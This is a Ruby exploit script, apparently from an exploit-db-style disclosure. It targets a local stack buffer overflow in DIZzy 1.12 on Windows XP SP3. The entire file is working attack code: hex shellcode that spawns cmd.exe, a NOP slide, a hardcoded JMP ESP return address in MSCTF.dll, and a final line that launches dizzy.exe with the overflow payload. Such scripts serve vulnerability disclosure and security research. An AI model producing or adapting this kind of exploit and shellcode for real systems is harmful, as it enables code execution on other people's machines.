#!/usr/bin/ruby
# Exploit Title: DIZzy 1.12 Local Stack Overflow
# Google Dork: n/a
# Date: 17/11/2010
# Author: g30rg3_x
# Version: 1.12
# Tested on: Windows XP SP3 Eng/Spa
# CVE: n/a
# Notes: Bug was originally found on 22/02/2010 but since there is no response from
#        developers it goes public.

# win32/xp sp2 cmd.exe 57 bytes - Mountassif Moad aka Stack
# http://www.exploit-db.com/exploits/13511/
shellcode  = "\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC" +
             "\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45" +
             "\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45" +
             "\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45" +
             "\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3"

# Preparing the exploit...
nop_slide  = "\x90" * 284
nop_slide2 = "\x90" * 17
jmp_esp    = "\x73\x18\x6E\x74" # win32/xp sp3 MSCTF.dll: JMP ESP
exploit    = nop_slide + jmp_esp + nop_slide2 + shellcode
executable = 'dizzy.exe'

# Boom!
exec(executable, exploit)